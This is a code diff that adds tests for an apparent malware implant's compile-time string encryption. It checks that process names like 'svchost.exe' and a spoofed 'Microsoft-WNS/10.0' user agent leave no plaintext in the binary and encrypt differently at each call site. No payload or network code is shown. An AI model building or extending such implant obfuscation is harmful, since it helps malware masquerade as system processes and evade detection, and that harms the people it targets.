@@ -14,6 +14,7 @@
 
 #include <cstdint>
 #include <cstdio>
+#include <cstring>
 #include <string>
 #include <vector>
 
@@ -110,6 +111,48 @@ int main() {
     for (size_t i = 0; i < 16; ++i)
         if ((ghost::ghost_stream_w(seed, i) >> 8) != 0) { highByteUsed = true; break; }
     check("wide keystream covers the high byte", highByteUsed);
+
+    // ── XS/XSW cipher round trip ───────────────────────────────────────────
+    // obfuscate.hpp builds the ciphertext with MakeCipher/MakeCipherW (at compile
+    // time, forced) and decodes it with the same keystream at run time. If the
+    // two ever disagree, every string in the implant turns to garbage — and only
+    // a runtime check can see that, so the invariant is asserted here on the
+    // platform-free half of the scheme.
+    std::printf("-- cipher round trip --\n");
+    {
+        static constexpr char kNarrow[] = "svchost.exe";
+        constexpr auto c = ghost::MakeCipher<sizeof(kNarrow), 42>(kNarrow);
+        bool ok = true;
+        for (size_t i = 0; i < sizeof(kNarrow); ++i)
+            if (static_cast<unsigned char>(c[i]) !=
+                static_cast<unsigned char>(static_cast<unsigned char>(kNarrow[i]) ^
+                                           ghost::ghost_stream(ghost::ghost_seed(42), i)))
+                ok = false;
+        check("narrow cipher == literal xor keystream", ok);
+
+        bool plaintextRun = false;
+        for (size_t i = 0; i + sizeof(kNarrow) <= sizeof(c); ++i)
+            if (std::memcmp(c.data() + i, kNarrow, sizeof(kNarrow)) == 0) { plaintextRun = true; break; }
+        check("narrow ciphertext carries no plaintext run", !plaintextRun);
+    }
+    {
+        static constexpr wchar_t kWide[] = L"Microsoft-WNS/10.0";
+        constexpr size_t WN = sizeof(kWide) / sizeof(wchar_t);
+        constexpr auto cw    = ghost::MakeCipherW<WN, 43>(kWide);
+        constexpr auto other = ghost::MakeCipherW<WN, 44>(kWide);
+        bool ok = true;
+        for (size_t i = 0; i < WN; ++i)
+            if (static_cast<unsigned>(cw[i]) !=
+                static_cast<unsigned>(static_cast<unsigned>(kWide[i]) ^
+                                      ghost::ghost_stream_w(ghost::ghost_seed(43), i)))
+                ok = false;
+        check("wide cipher == literal xor keystream", ok);
+
+        bool siteDiffers = false;
+        for (size_t i = 0; i < WN; ++i)
+            if (cw[i] != other[i]) { siteDiffers = true; break; }
+        check("same literal at another call site encrypts differently", siteDiffers);
+    }
 
     std::printf("\n%d passed, %d failed\n", g_pass, g_fail);
     return g_fail ? 1 : 0;
